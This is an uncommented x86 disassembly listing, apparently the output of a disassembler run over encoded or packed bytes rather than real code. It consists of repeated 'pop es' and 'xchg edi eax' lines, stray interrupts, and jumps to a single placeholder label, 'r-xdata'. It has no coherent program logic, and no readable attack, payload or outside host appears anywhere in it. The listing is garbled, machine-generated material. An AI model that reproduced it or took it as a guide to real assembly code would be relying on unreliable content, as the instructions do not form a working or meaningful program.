mov al [ 0x7079797 ]
pop es
pop es
sub_48d9fd
bound ebp [ eax + 0x68 ]
pop es
jle r-xdata
pop es
pop es
xchg esp eax
xchg edi eax
xchg edi eax
sbb al 0x51
jle r-xdata
popad
cwde
sbb ecx edi
test [ edi + 0x572f1c97 ] edx
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xdb
mov bl 0x87
jle r-xdata
mov ch 0x97
xchg edi eax
pop es
pop es
pop es
cwde
adc esi edx
push 0x7070707
cwde
adc ecx edi
imul ebp [ eax + 0x68 ] 0x97844e7e
xchg edi eax
pop es
pop es
pop es
rcl [ edx ] 0x1
inc ebp
jle r-xdata
push 0x7e070768
daa
test eax 0x437e9797
mov eax [ 0x7079797 ]
pop es
into
jle r-xdata
int1
push ds
rol [ ebp - 0x31 ] cl
jle r-xdata
push 0x6d1c0707
adc al 0x6d
mov edx 0x97b9bb7e
xchg edi eax
push eax
shr [ edi ] cl
fcmovu st2
iretd
pop es
mov al [ 0xffffffffe2689797 ]
xchg [ esi + 0x11 ] edi
jb r-xdata
rcl [ edi + 0x6fd21497 ] 0x1
mov edi 0x9799ff7e
xchg edi eax
pop es
pop ds
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sar [ esi - 0x6c ] 0x48
push 0x7070768
pop es
pop es
sbb al 0x56
jle r-xdata
arpl [ eax + 0x68 ] bp
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
rcr [ edi + ebp * 2 ] 0x7e
jbe r-xdata
push 0x7070707
int1
push ds
shl [ ebp - 0x31 ] cl
std
in al 0xc9
jle r-xdata
fist [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
pop es
pop es
std
lodsd [ esi ]
iretd
cmp edx [ edi - 0x57816869 ]
push 0x7070707
pop es
pop es
sar [ esi + 0xa ] 0xd6
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb al 0x9f
jle r-xdata
int3
jpe r-xdata
xchg edi eax
jle r-xdata
inc edx
push 0x7070768
push 0x993f7e80
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
lodsb [ esi ]
rcr [ edi + 0x687ac57e ] cl
aad 0x97
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
push 0xcc7e0768
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
rcr [ edi ] 0x7e
sub [ edi + 0x68 ] ecx
iretd
mov [ 0xfffffffffdc79797 ] al
cmp [ esi - 0x17 ] 0x79797ac
pop es
std
fdivrp st1
push ds
shl [ ebx - 0x31 ] cl
jle r-xdata
pop ebx
mov [ edi + 0x1ef10797 ] ss
rol [ edi - 0x31 ] cl
std
salc
xchg edi eax
xchg edi eax
les edi [ esi + 0x6b ]
inc eax
push 0x75139868
mov bh 0x97
xchg edi eax
sbb bl dl
inc ebx
sbb dl dl
xor edi [ esi - 0x6b ]
js r-xdata
push 0x7eb2fd07
shl [ ebx + 0x1f ] cl
rcl [ ebx + 0x7e ] cl
or [ eax + 0x68 ] al
push 0x6a4f121c
push 0x9fd2ac68
jle r-xdata
jl r-xdata
pop es
std
fcmove st0
jle r-xdata
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
sbb dl dl
daa
sar [ esi - 0x60 ] 0xb5
xchg edi eax
xchg edi eax
pop es
pop es
push 0x97973b01
xchg edi eax
jle r-xdata
jno r-xdata
adc dl [ edi + 0x7e ]
retn 0x686b
pop es
pop es
adc al 0x53
fwait
jle r-xdata
push 0x7070707
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg edi eax
push 0x68bfb3e3
shl ebx 0x7e
or edx edx
xchg edi eax
xchg edi eax
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
push 0x50070707
shl [ edi - 0x1d ] cl
mov bh 0xdf
pop es
jle r-xdata
mov edx 0x7079797
pop es
imul ebx [ eax - 0x3337a8fd ] 0x5e
push esp
int1
scasb [ edi ]
mov [ 0xffffffffba157e86 ] eax
xchg edi eax
xchg edi eax
pop es
shr [ edi ] cl
iretd
loope r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
sub ebp [ ebp + 0x68 ]
push 0xbbc168c7
sbb dl [ edx ]
pop edi
push 0x68
push 0x75027ec7
push 0x7070768
pop es
insd
push 0xc168c768
mov ebx 0x6a5f121a
push 0x27ec768
jne r-xdata
push 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
int1
push ds
shr [ edi - 0x3 ] cl
out dx eax
jle r-xdata
push 0x7070707
pop es
push ds
adc [ edi - 0x69 ] edi
xchg edi eax
xchg edi eax
jg r-xdata
sar [ edi ] cl
jle r-xdata
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
nop
pop es
pop es
nop
xchg edi eax
xchg edi eax
adc al 0x53
mov bh 0x1e
adc [ edi - 0x69 ] esp
xchg edi eax
xchg edi eax
sbb dl dl
ja r-xdata
pop es
jne r-xdata
xchg edi eax
enter 0x707e 0x7b
push 0x7070768
mov dl 0x97
xchg edi eax
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec esp
salc
popad
push 0x7070768
pop es
pop es
sbb al 0x72
jle r-xdata
pop es
pop es
sbb bl dl
jg r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
and [ esi + 0x6844977e ] al
push 0xd21ef107
inc ecx
jle r-xdata
push 0xd64c7e68
push 0x6875877e
push 0x7070707
pop es
pop es
pop es
pop es
pop es
rcr [ edx ] 0x1a
sbb ebp [ edx + 0x68 ]
mov ch 0x97
xchg edi eax
pop es
pop es
pop es
jle r-xdata
xchg edi eax
pop es
pop es
pop es
jg r-xdata
xchg edi eax
xchg edi eax
jle r-xdata
mov dh 0x97
mov ebp 0x7079797
pop es
pop es
nop
xchg edi eax
xchg edi eax
pop es
pop es
scasd [ edi ]
0x7e87
pop es
pop es
pop es
call [ edi + 0x7e979787 ]
adc [ edi + 0x7070797 ] 0xc2
sbb al 0x7b
adc al 0xea
fwait
xchg edi eax
jle r-xdata
push 0x97b4367e
xchg edi eax
int1
push ds
0xf171
push 0x23016807
xchg edi eax
xchg edi eax
mov al [ 0x7079797 ]
pop es
pop es
sub_48db7e
mov [ 0xfffffffffdc09797 ] al
xchg ebx eax
xchg [ edx - 0x23f6869 ] esp
pushad
iretd
xchg [ edi - 0x62cb8069 ] edx
xchg edi eax
xchg edi eax
jle r-xdata
jle r-xdata
lodsd [ esi ]
xchg edi eax
xchg edi eax
int1
push ds
ror [ edi + 0x7e ] cl
fwait
imul ebp [ eax + 0x68 ] 0xabc168c4
movsb [ edi ] [ esi ]
push edi
scasb [ edi ]
0x5703986b 0xccc8
push 0xff070768
xchg edi eax
xchg edi eax
xchg edi eax
xlat
jle r-xdata
jns r-xdata
push 0xc168c768
mov ebx 0x6a5f121a
push 0x27ec768
jne r-xdata
jle r-xdata
push 0xa2877ecf
xchg edi eax
xchg edi eax
sar ch 0x93
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
pop es
int1
push ds
shr [ edi - 0x3 ] cl
out dx eax
jle r-xdata
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
nop
insd
push 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg edi eax
enter 0x707e 0x7b
push 0x7070768
mov dl 0x97
xchg edi eax
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec esp
salc
popad
push 0x7070768
pop es
pop es
sbb al 0x72
jle r-xdata
pop es
push ds
adc [ edi - 0x69 ] edi
xchg edi eax
xchg edi eax
jg r-xdata
sar [ edi ] cl
jle r-xdata
pop es
pop es
pop es
rcr [ edx ] 0x1a
sbb ebp [ edx + 0x68 ]
mov ch 0x97
xchg edi eax
pop es
pop es
pop es
jle r-xdata
xchg edi eax
pop es
pop es
pop es
jg r-xdata
xchg edi eax
xchg edi eax
jle r-xdata
mov dh 0x97
pop es
pop es
nop
xchg edi eax
xchg edi eax
adc al 0x53
mov bh 0x1e
adc [ edi - 0x69 ] esp
xchg edi eax
xchg edi eax
sbb dl dl
ja r-xdata
pop es
pop es
jne r-xdata
pop es
pop es
pop es
call [ edi + 0x7e979787 ]
adc [ edi + 0x7070797 ] 0xc2
sbb al 0x7b
adc al 0xea
fwait
xchg edi eax
jle r-xdata
push 0x97b4367e
xchg edi eax
int1
push ds
0xf171
push 0x23016807
xchg edi eax
xchg edi eax
pop es
pop es
sbb bl dl
jg r-xdata
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
and [ esi + 0x6844977e ] al
push 0xd21ef107
inc ecx
jle r-xdata
push 0xd64c7e68
push 0x6875877e
push 0x7070707
pop es
pop es
mov al [ 0x7079797 ]
pop es
pop es
mov ebp 0x7079797
pop es
pop es
nop
xchg edi eax
xchg edi eax
pop es
pop es
scasd [ edi ]
0x7e87
sub_48dc2a
xchg [ edi + 0x7070797 ] edx
pop es
pop es
nop
xchg edi eax
xchg edi eax
adc al 0x53
mov bh 0x1e
adc [ edi - 0x69 ] esp
xchg edi eax
xchg edi eax
sbb dl dl
ja r-xdata
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
enter 0x707e 0x7b
push 0x7070768
mov dl 0x97
xchg edi eax
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
pop es
pop es
sbb bl dl
jg r-xdata
jle r-xdata
pop es
pop es
pop es
rcr [ edx ] 0x1a
sbb ebp [ edx + 0x68 ]
mov ch 0x97
xchg edi eax
pop es
pop es
pop es
jle r-xdata
push ds
adc [ edi - 0x69 ] edi
xchg edi eax
xchg edi eax
jg r-xdata
pop es
sar [ edi ] cl
jle r-xdata
mov ebp 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
nop
xchg edi eax
xchg edi eax
pop es
pop es
scasd [ edi ]
0x7e87
pop es
pop es
pop es
call [ edi + 0x7e979787 ]
adc [ edi + 0x7070797 ] 0xc2
sbb al 0x7b
adc al 0xea
fwait
xchg edi eax
jle r-xdata
pop es
pop es
jne r-xdata
nop
mov al [ 0x7079797 ]
pop es
pop es
push 0xd64c7e68
push 0x6875877e
push 0x7070707
pop es
pop es
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
cwde
and [ esi + 0x6844977e ] al
push 0xd21ef107
inc ecx
jle r-xdata
dec esp
salc
popad
push 0x7070768
pop es
pop es
sbb al 0x72
jle r-xdata
xchg edi eax
pop es
pop es
pop es
jg r-xdata
xchg edi eax
xchg edi eax
jle r-xdata
mov dh 0x97
push 0x97b4367e
xchg edi eax
int1
push ds
0xf171
push 0x23016807
xchg edi eax
xchg edi eax
sub_48dce1
mov cl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97fdbbc0
push 0x97973b00
xchg edi eax
enter 0x754 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
rcr [ edx ] 0x1a
sbb ebp [ edx + 0x68 ]
push 0x97b4367e
xchg edi eax
int1
push ds
0xf171
sub_48de89
les edi [ esi - 0x1c ]
adc [ edi + 0x7070797 ] 0x7
jle r-xdata
pop es
pop es
pop es
pop es
xchg [ edi + 0x7ec20797 ] edx
fdivr [ edi + edx * 4 + 0x7070797 ]
pop es
std
sti
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
lodsb [ esi ]
retn
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb dl [ edx ]
retn
sub_48deb1
insb
push 0xc17ec768
push 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
outsd
push 0x7070707
pop es
cwde
adc ecx [ ebp + edi * 4 - 0x69 ]
xchg edi eax
adc al 0xeb
mov bl 0xb3
xchg edi eax
cwde
adc eax [ edi - 0x43 ]
xchg edi eax
xchg edi eax
cwde
and esp edx
scasd [ edi ]
jle r-xdata
leave
push 0x7070768
pop es
pop es
pop es
pop es
leave
jle r-xdata
push 0x6840737e
push 0x7070707
pop es
jle r-xdata
adc al 0x6f
outsd
push 0x9a7ec068
adc [ edi + 0x7070797 ] 0x7
int1
push ds
fisub [ edi - 0x32 ]
jle r-xdata
jmp [ edi ]
stosd [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
int1
push ds
shl [ ebx - 0x53813057 ] cl
jpo r-xdata
adc dl [ edi + 0x7e ]
stc
jne r-xdata
xchg [ edi + 0x40b67e97 ] dl
push 0x7070768
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x7e91
pop es
cwde
push 0x684a4f7e
push 0x7070707
pop es
pop es
push ds
shr [ edi + 0x7e ] cl
sub al [ eax + 0x68 ]
push 0x1cc70707
push ecx
jle r-xdata
pop es
adc al 0xd2
imul edi [ edi + 0x337ecece ] 0xffffffa3
xchg edi eax
xchg edi eax
pop es
pop es
rcl [ edi - 0x32813b69 ] 0x1
pop es
pop es
pop es
pop es
pop es
pop es
xlat
pop esi
push esp
pop es
adc [ edi + 0x7e57a497 ] 0x56
push 0x7e070768
mov ch 0xb1
xchg edi eax
xchg edi eax
pop es
mov esp 0x7075496
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jpe r-xdata
imul ebp [ eax + 0x68 ] 0x7f
mov [ 0x6f1c9797 ] ax
jle r-xdata
dec edx
rcl [ edi - 0x2fbe8169 ] 0x1
xchg edi eax
xchg edi eax
les edi [ esi - 0x33 ]
fst [ edi - 0x2de5f869 ]
dec ebx
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
fcom [ edi + 0x7070797 ]
pushad
dec edi
jle r-xdata
std
loopne r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
push 0x897f0768
push 0x9fda1c68
cdq
xchg edi eax
xchg edi eax
pop es
pop es
pop es
xchg edi eax
std
xlat
jle r-xdata
int1
push ds
fisubr [ ecx + 0x7e ]
sub al 0x8f
xchg edi eax
xchg edi eax
push 0x68
push 0x6bd21407
mov edi 0x337ecece
mov [ 0x7079797 ] eax
pop es
pop es
movsb [ edi ] [ esi ]
push 0xd7c21ef1
sbb al 0x4f
movsb [ edi ] [ esi ]
inc ebp
push ds
0xf173
jle r-xdata
inc esi
push 0x7070768
pop es
xchg edi eax
pop es
std
xchg edi eax
push 0x97973b01
ficom [ edi + 0x7070797 ]
jle r-xdata
pop edx
push 0x94197e68
xchg edi eax
xchg edi eax
pop es
jle r-xdata
rcl [ edi + 0x7070797 ] cl
pop es
pop es
pop es
pop es
pop es
push [ eax - 0x3f33002a ]
push ds
adc [ ebx ] ecx
xchg edi eax
xchg edi eax
xchg edi eax
jg r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
int1
adc al 0xec
rcl [ edi - 0x68286482 ] 0x1
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x7b
jle r-xdata
adc cl [ edx - 0x30 ]
xchg edi eax
xchg edi eax
jle r-xdata
rcl [ edi - 0x67f8f869 ] cl
pop es
mov edx 0x7079797
pop es
pop es
pop es
push ds
shl edi 0x1
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
push ds
adc [ edi ] esi
sbb dl [ edx ]
outsd
push 0x68
push 0x97d3ba7e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
iretd
pop es
pop es
rcr [ esi ] 0x12
popad
cwde
adc ebp [ 0x7e686861 ]
or [ esi + 0x68 ] esp
push 0x64897f07
push 0x9fda1c68
mov ch 0x97
xchg edi eax
pop es
pop es
retn 0x7b1c
sub_48e0b6
push 0x1cc10707
adc ah [ ecx - 0x68 ]
adc ebp [ 0x7e686861 ]
or [ esi + 0x68 ] esp
push 0x64897f07
push 0x9fda1c68
sbb dl [ edx ]
outsd
push 0x68
push 0x97d3ba7e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
iretd
sub_48e0e4
std
mov ecx 0x687d4f7e
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jg sub_48e115
jpo r-xdata
jne r-xdata
push 0x13985712
xchg edx eax
xchg edi eax
xchg edi eax
xchg edi eax
movsb [ edi ] [ esi ]
pop esi
int1
push ds
lahf
push esp
pop es
int1
push ds
0xf1691c49 0xea1e
sar [ esi + 0x44 ] 0xab
push 0x6c946f1c
lahf
std
xchg edi eax
jl r-xdata
pop es
pop es
pop es
pop es
jg r-xdata
mov eax 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
les edx [ esi + edx * 2 ]
jg r-xdata
jno r-xdata
adc [ edi + 0x7070797 ] 0x60
push 0x4b5a7ece
push 0x121a0707
out dx eax
push 0x68
push 0x667ec7c4
nop
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
pop esp
push 0xa57ece68
xchg edx eax
xchg edi eax
xchg edi eax
sbb al 0xd2
sar [ esi - 0x74 ] 0x71
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push edi
adc [ eax ] dh
mov eax [ 0xffffffff97a9c77e ]
xchg edi eax
pop es
pop es
push 0xcf7e6868
jle r-xdata
push 0x97fd0707
xchg edi eax
jle r-xdata
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
xchg esp eax
xchg edi eax
xchg edi eax
jg r-xdata
lodsd [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
stosd [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
xchg edi eax
xchg edi eax
pop es
pop es
pop es
call [ ebx + 0x1a979796 ]
adc dl [ ebx ]
insb
push 0x867d7e68
xchg edi eax
xchg edi eax
pop es
std
int1
int1
push ds
shr [ edi - 0x31 ] cl
std
mov ecx 0x6dd21ef1
jle r-xdata
pop es
pop es
pop es
pop es
cwde
adc ebp [ ecx + 0x76 ]
push 0xb3eb1468
mov edx [ esi - 0x5b76ed68 ]
xchg edi eax
xchg edi eax
adc al 0xeb
mov bl 0x83
xchg esi eax
cwde
adc al [ ecx + 0x7e686878 ]
xchg edx eax
mov esp 0x7079797
pop es
pop es
pop es
sbb dl bl
mov bl 0xdb
jle r-xdata
imul ebp [ eax + 0x68 ] 0xffffff98
and ah dl
mov esi ecx
adc dl [ edi - 0x68 ]
adc ebx [ edi + 0x1c686875 ]
outsd
xchg esp eax
insb
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
jle r-xdata
jge r-xdata
jle r-xdata
dec ebx
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
retn 0x7b1c
adc [ edi + 0x4b807e97 ] 0x7076868
pop es
push 0x7070768
pop es
pop es
int1
scasb [ edi ]
lahf
jle r-xdata
pop edx
dec ebx
jo r-xdata
dec edi
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop esi
push esp
rol ecx 0x7e
inc esp
stosd [ edi ]
push 0x7070707
cmpsb [ esi ] [ edi ]
jle r-xdata
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
xchg edi eax
xchg edi eax
rcl [ edi + 0x7070797 ] cl
pop es
pop es
pop es
pop es
pop es
into
sbb al 0x6f
push ds
fidivr [ edi ]
jle r-xdata
popfd
xchg edi eax
xchg edi eax
push ss
jpo r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
jle r-xdata
jg r-xdata
inc edi
inc edi
push 0xa67f0768
jo r-xdata
pop es
pop es
pop es
jle r-xdata
jl r-xdata
mov bl 0xa9
xchg edi eax
xchg edi eax
int1
push ds
ror [ edi - 0x31 ] cl
jle r-xdata
sahf
xchg edi eax
xchg edi eax
jle r-xdata
scasb [ edi ]
in al dx
mov edi 0x83de1298
xchg edi eax
xchg edi eax
jle r-xdata
rcl [ edi + 0x50070797 ] 0x1
push 0x7070707
pop es
mov al [ 0xffffffffcf079797 ]
std
int1
push ds
sar [ edi - 0x31 ] cl
std
stc
jle r-xdata
push 0x7070707
pop es
pop es
jg r-xdata
add [ edi ] edx
push 0x7070707
int 0xf1
push ds
retn 0xfdf3
fist [ edi - 0x63813e69 ]
push 0x7e571268
mov ah 0xaf
xchg edi eax
xchg edi eax
jle r-xdata
mov ah 0x97
xchg edi eax
pop es
pop es
pop es
cwde
adc cl dh
adc [ edi + 0x47647e97 ] 0x68
push 0x47a67f07
cmpsb [ esi ] [ edi ]
xchg edi eax
xchg edi eax
arpl [ eax + 0x68 ] bp
cwde
adc bl dh
adc [ edi - 0x5f078169 ] 0xffffff97
xchg edi eax
pop es
iretd
shl [ edi - 0xa ] cl
loope r-xdata
xchg edi eax
pop es
pop es
push eax
push eax
shl [ ebx - 0x19 ] cl
pop es
sbb bh bl
mov bl 0x1b
jle r-xdata
inc eax
push 0x9bcaae68
cwde
adc ebx [ edi ]
mov [ 0x187e9797 ] al
arpl [ eax + 0x68 ] bp
pop es
pop es
pop es
pop es
pop es
pop es
test al 0x97
xchg edi eax
adc al 0x6f
xchg esi eax
cwde
adc ebp [ ecx + edx * 8 + 0x57a49797 ]
push ds
shl [ ebx - 0x4c2ce171 ] cl
mov ebp [ esi + 0x11988fd4 ]
dec ebx
jns r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
push ds
adc [ edi - 0x69 ] edx
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
inc [ edi - 0x6a ]
xchg esi eax
xchg edi eax
movsb [ edi ] [ esi ]
dec esp
les ebp [ eax + 0x1 ]
pop ss
mov esp 0xc9079797
int3
or al 0xa2
xchg edi eax
xchg edi eax
pop es
int1
push ds
fisub [ ebx + 0x7e ]
inc esp
mov dh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
xchg [ edi - 0x81f869 ] edx
jpe r-xdata
jle r-xdata
pop es
adc al 0xea
imul edx [ eax + ebx * 4 - 0x686373eb ] 0xffffff97
push 0x68
push 0x7070707
pop es
rcr [ edx ] 0x1a
sbb ebp [ edx + 0x68 ]
push 0x97bf897e
xchg edi eax
pop es
pop es
push 0x97abbe7e
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
jg r-xdata
jle r-xdata
pop es
adc al 0xf2
imul edx [ edi - 0x6864c782 ] 0xffffff97
pop es
sbb al 0x4d
push 0x6bd21c68
jle r-xdata
inc ebx
jle r-xdata
push 0xff6868
test [ esi + 0x747ec029 ] dh
xchg ebx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
pop es
dec ebp
push 0x754c968
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
loope r-xdata
shl [ ecx + 0x7e ] cl
jge r-xdata
popfd
xchg edi eax
xchg edi eax
sbb al 0x6f
jle r-xdata
jns r-xdata
jle r-xdata
push ss
inc edx
push 0x7070768
pop es
std
in al 0x7e
call 0x7b14d32
pop es
sbb bl dl
inc ebx
sbb dl dl
push ebx
jle r-xdata
int1
push ds
push 0xd47e0707
dec ecx
push 0x7070768
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
movsb [ edi ] [ esi ]
inc ebp
push ds
shr [ ebx + 0x1c ] cl
fisubr [ ebx + 0x1c ]
jmp r-xdata
cwde
adc ch ah
inc eax
push 0x40f87e68
push 0x97fd0768
jle r-xdata
inc eax
push 0x97976300
push 0x7a139868
dec ebp
push 0xa5697e07
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
xchg edi eax
jle r-xdata
add [ ebx - 0x69 ] ah
xchg edi eax
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp [ edi ]
adc [ edi - 0x73be8169 ] 0xffffff97
xchg edi eax
push 0x7ec8c7c0
xchg edx eax
mov bh 0x97
xchg edi eax
xlat
jle r-xdata
push 0xd7ef7e68
xchg edi eax
xchg edi eax
pop ebx
push 0x7070768
int1
push ds
0x7e33
cmp [ ebx + 0x1c079797 ] bl
dec ebp
jae r-xdata
lea esp [ ebx + 0x7079797 ]
aam 0x97
xchg edi eax
std
in al 0x7e
adc [ eax + ebp * 2 + 0x68 ] bl
pop es
int1
push ds
sar [ ebp - 0x31 ] cl
std
jecxz r-xdata
pop es
pop es
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x56
int1
push ds
rol [ ebx - 0x31 ] cl
std
in al 0x7e
sbb eax [ ebx + 0x68 ]
push 0x1ef1eefd
rol [ ebx + 0x7e ] cl
adc [ ebp + 0x1ef19797 ] ebx
push 0x7070707
pop es
pop es
sar [ esi - 0x20 ] 0x5c
push 0x9f97ff68
xchg edi eax
xchg edi eax
jle r-xdata
0x7079797 0x707
pop es
pop es
pop es
pop es
jle r-xdata
pop es
adc dl [ edi - 0x68 ]
adc edx [ ebx - 0x38686869 ]
push 0xec149fc1
xlat
xchg edi eax
jle r-xdata
pop esi
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
rol bh 0x7f
cmp al 0x97
xchg edi eax
xchg edi eax
adc al 0x53
fwait
jle r-xdata
dec edx
push 0x6f14ce68
pop eax
push 0x7070768
pop es
scasb [ edi ]
0x7e9b
xchg edi eax
xchg edi eax
jg r-xdata
pop es
pop es
pop es
int1
push ds
retn 0x7eb9
jbe r-xdata
pop es
std
xchg ebx eax
call [ edi + 0x7e9797a7 ]
sets [ edi + 0x20680797 ]
pop ebx
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov [ 0x7079797 ] eax
mov ah [ ebx + 0x68 ]
push 0x4ea91398
push 0x7e93fd68
jbe r-xdata
mov eax 0x7079797
pop es
pop es
xchg ebp eax
jle r-xdata
adc al 0x6f
stosd [ edi ]
xchg edi eax
xchg edi eax
sbb al 0x6f
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb al 0x46
jle r-xdata
push 0x7070707
pop es
push 0x7070768
pop es
xchg [ edi + edx * 4 + 0x7070797 ] eax
pop es
outsd
push 0x237ec268
lea edx [ edi + 0x7070797 ]
pop es
pop es
pop es
pop es
rol eax 0xc5
sub [ eax ] esi
push ecx
xchg ebx eax
jle r-xdata
xlat
xchg edi eax
xchg edi eax
jle r-xdata
pop es
push ss
scasd [ edi ]
popfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
adc [ edi - 0x69 ] ebx
pop es
pop es
pop es
pop es
pop es
pop es
push 0x97971b01
xchg edi eax
jle r-xdata
fwait
xchg edi eax
xchg edi eax
pop es
pop es
adc dl [ edi - 0x68 ]
adc ebx [ ebx ]
outsd
push 0x41387e68
push 0xc47ec068
salc
xchg edi eax
xchg edi eax
pop es
pop es
pop es
sbb dl bl
mov bl 0xaf
xchg edi eax
imul ebp [ eax + 0x68 ] 0x16
sub [ ebx ] ebp
xchg edi eax
xchg edi eax
xchg edi eax
arpl [ esi + 0x1b989797 ] dx
push esi
mov eax 0x437e9797
sbb al 0xca
imul ebx [ esp + ecx * 4 ] 0xffffff94
inc esi
jle r-xdata
je r-xdata
pop es
jle r-xdata
pop es
pop es
pop es
pop es
arpl [ eax + 0x68 ] bp
cwde
adc ebp [ ecx - 0x29797b2 ]
xchg [ edi + 0x7e97fd97 ] dl
sub [ ebx + 0x7079797 ] al
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push 0x5ea4f3c7
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
mov ebx 0x7079797
int1
push ds
rol [ ebx + 0x1c ] cl
push esi
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
scasb [ edi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
jle r-xdata
pop es
jle r-xdata
into
push 0x7070707
inc eax
push 0x752b7e68
push 0x7070768
pop es
pop es
jle r-xdata
movsb [ edi ] [ esi ]
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb bl [ edx ]
pop edi
push 0x68
push 0x9787947e
pop es
pop es
mov ss [ edi + 0x7070797 ]
xchg edi eax
jle r-xdata
aam 0x97
xchg edi eax
pop es
pop es
jle r-xdata
pop es
pop es
pop es
call [ ebx + 0x7e979796 ]
arpl [ edx + 0x68 ] bx
push 0x20980707
push edi
mov ebp 0x7079797
pop es
scasd [ edi ]
xchg edi eax
xchg edi eax
pop es
jle r-xdata
jle r-xdata
mov [ 0x7079797 ] al
pop es
pop es
pop es
jle r-xdata
std
xchg edi eax
sar [ esi + 0x36 ] 0x92
xchg edi eax
xchg edi eax
adc [ edi + 0x7070797 ] 0x1a
sbb bl [ edi + 0x6a ]
push 0x87947e68
xchg edi eax
sub_48e115
outsb
dec esp
push 0xa57e0768
mov [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
